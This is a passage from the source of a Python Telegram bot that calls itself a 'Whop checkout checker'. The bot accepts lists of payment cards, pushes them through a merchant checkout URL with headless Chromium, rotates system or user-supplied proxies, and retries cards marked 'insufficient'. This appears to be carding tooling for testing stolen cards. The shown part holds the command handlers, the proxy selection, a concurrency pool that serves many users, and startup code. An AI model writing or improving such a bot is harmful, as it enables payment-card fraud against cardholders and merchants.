    PENDING_REF[m.chat.id] = target
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("⏹ System Proxies", callback_data="px_sys"))
    kb.add(types.InlineKeyboardButton("⚙ Use My Proxies", callback_data="px_add"))
    bot.send_message(
        m.chat.id,
        f"┌─ 💳 *REF / BUY-VIP READY*\n"
        f"│\n"
        f"{note}"
        f"├─ 💳 cards   : {len(target)}\n"
        f"── choose a proxy source æç",
        parse_mode="Markdown", reply_markup=kb)


@bot.message_handler(commands=["live"])
def cmd_live(m):
    udb = user_db(m.chat.id)
    ins = [c for c in udb["ccs"] if c.get("status") == "insufficient"]
    if not ins:
        bot.send_message(m.chat.id, "? nothing insufficient to retry")
        return
    url = udb["settings"].get("checkout_url")
    if not url:
        bot.send_message(m.chat.id, "⚠️ run /whop first so I know the url")
        return
    bot.send_message(m.chat.id,
                     f"┌─ 🌐 *LIVE RETRY*\n"
                     f"── retrying {len(ins)} insufficient card(s)",
                     parse_mode="Markdown")
    _start_heavy(m.chat.id, run_check, m.chat.id, url, all_proxies(m.chat.id), ins)


@bot.message_handler(commands=["db"])
def cmd_db(m):
    send_db(m.chat.id)


PENDING = {}        # chat_id -> checkout url (awaiting proxy choice)
PENDING_CARDS = {}   # chat_id -> cards given inline with /whop (run only those)
PENDING_REF = {}     # chat_id -> target cards for a /ref run (awaiting proxy choice)
ABORT = {}           # chat_id -> True when user hits Stop


# ---------- concurrency + anti-spam (offload heavy work; serve many users) ----------
# Heavy runs (check / ref) are bounded so N users don't launch N browsers at
# once. Light work (proxy tests) runs in its own pool so it never blocks on a
# heavy run. Per-user guard: one active run per chat. Global guard: at most
# MAX_CONCURRENT_RUNS run at once; extras queue automatically on the pool.
MAX_CONCURRENT_RUNS = int(os.environ.get("MAX_CONCURRENT_RUNS", "3"))
heavy_pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_RUNS)
light_pool = ThreadPoolExecutor(max_workers=8)
# Process-wide cap on SIMULTANEOUS browsers. Running 2+ Chromium at once on a
# small railway container OOMs, so even if several runs/users queue up, we never
# launch more browsers than the container can feed. Default 2 (one run's 2
# workers); raise MAX_BROWSERS only if you bump container memory.
MAX_BROWSERS = int(os.environ.get("MAX_BROWSERS", "2"))
BROWSER_SEM = threading.BoundedSemaphore(MAX_BROWSERS)

_user_active = {}     # chat_id -> True (this user already has a run going)
_heavy_active = 0     # count of submitted heavy jobs (incl. queued)
_conc_lock = threading.Lock()


def _start_heavy(chat_id, fn, *args):
    """Run a heavy task in the bounded pool and return immediately.

    Logic of fn is unchanged; only its *execution context* changes. A user can
    have at most one run at a time; globally at most MAX_CONCURRENT_RUNS run
    concurrently, the rest queue and start automatically.
    """
    global _heavy_active
    with _conc_lock:
        if _user_active.get(chat_id):
            try:
                bot.send_message(
                    chat_id,
                    "⚠️ you already have a run in progress  use ¢æ Stop or wait for it to finish.")
            except Exception:
                pass
            return
        _user_active[chat_id] = True
        queued = _heavy_active >= MAX_CONCURRENT_RUNS
        _heavy_active += 1
    if queued:
        try:
            bot.send_message(
                chat_id,
                f" all {MAX_CONCURRENT_RUNS} worker slots busy  your run is queued and will start automatically.")
        except Exception:
            pass

    def _job():
        try:
            fn(*args)
        except Exception as e:
            print("RUN JOB ERROR:", repr(e), flush=True)
        finally:
            global _heavy_active
            with _conc_lock:
                _user_active.pop(chat_id, None)
                _heavy_active -= 1
    heavy_pool.submit(_job)


def _start_light(chat_id, fn, *args):
    """Run a light/IO task (proxy tests) without blocking the bot."""
    light_pool.submit(lambda: _safe(fn, *args))


def _safe(fn, *args):
    try:
        fn(*args)
    except Exception as e:
        print("LIGHT JOB ERROR:", repr(e), flush=True)


@bot.callback_query_handler(func=lambda c: c.data in ("px_sys", "px_add"))
def cb_proxy(c):
    chat_id = c.message.chat.id
    url = PENDING.get(chat_id)
    is_ref = chat_id in PENDING_REF
    if not url and not is_ref:
        bot.edit_message_text("⚠️ run /whop or /ref first", chat_id,
                              c.message.message_id)
        return

    use_system = (c.data == "px_sys")
    if use_system:
        bot.edit_message_text("? using system proxies", chat_id,
                              c.message.message_id)
        proxies = system_proxies()
    else:
        ups = user_proxies(chat_id)
        if not ups:
            bot.edit_message_text(
                "⚠️ no proxies saved yet  add some with /addproxy first",
                chat_id, c.message.message_id)
            return
        bot.edit_message_text("? using your saved proxies", chat_id,
                              c.message.message_id)
        proxies = ups

    if is_ref:
        target = PENDING_REF.pop(chat_id, [])
        _start_heavy(chat_id, run_ref_flow, chat_id, target, proxies)
    else:
        u = PENDING.pop(chat_id, None)
        _start_heavy(chat_id, run_check, chat_id, u, proxies,
                     PENDING_CARDS.pop(chat_id, None) or None)


@bot.callback_query_handler(func=lambda c: c.data == "stop")
def cb_stop(c):
    ABORT[c.message.chat.id] = True
    bot.answer_callback_query(c.id, text="🛑 stopping now…")
    try:
        bot.edit_message_text("🛑 *Stopping now* — aborting current checkout…",
                              c.message.chat.id, c.message.message_id,
                              parse_mode="Markdown")
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data.startswith("m_"))
def cb_menu(c):
    bot.answer_callback_query(c.id)
    if c.data == "m_db":
        send_db(c.message.chat.id, c.message.message_id)
    elif c.data == "m_addp":
        bot.send_message(c.message.chat.id,
                         "⚙ /addproxy `user:pass@host:port`",
                         parse_mode="Markdown")
    elif c.data == "m_prox":
        cmd_proxy(c.message)
    elif c.data == "m_whop":
        bot.send_message(c.message.chat.id,
                         "∩╕Å /whop `<checkout url>`", parse_mode="Markdown")


if __name__ == "__main__":
    load_db()
    threading.Thread(target=auto_backup_loop, daemon=True).start()
    # clear any webhook (e.g. left by a previous/foreign bot on this token)
    # so long-polling works and no stale updates are replayed
    try:
        bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
    # overwrite any spammy bot bio/description left by a previous token owner
    try:
        bot.set_my_description(
            "Whop checkout checker bot. Send /start for commands.")
        bot.set_my_short_description("Whop checkout checker")
    except Exception:
        pass
    # Ensure the Playwright browser + its system libraries exist in THIS
    # runtime environment. Railway's build may install to a path the running
    # container doesn't see, or may skip --with-deps, so we install both here.
    try:
        import subprocess, sys
        print("[ensuring chromium + deps are installed]", flush=True)
        subprocess.run([sys.executable, "-m", "playwright", "install",
                        "--with-deps", "chromium"], check=False, timeout=400)
    except Exception as e:
        print("[playwright install skipped:", e, "]", flush=True)
    print("[whop checker bot online]")
    bot.infinity_polling()
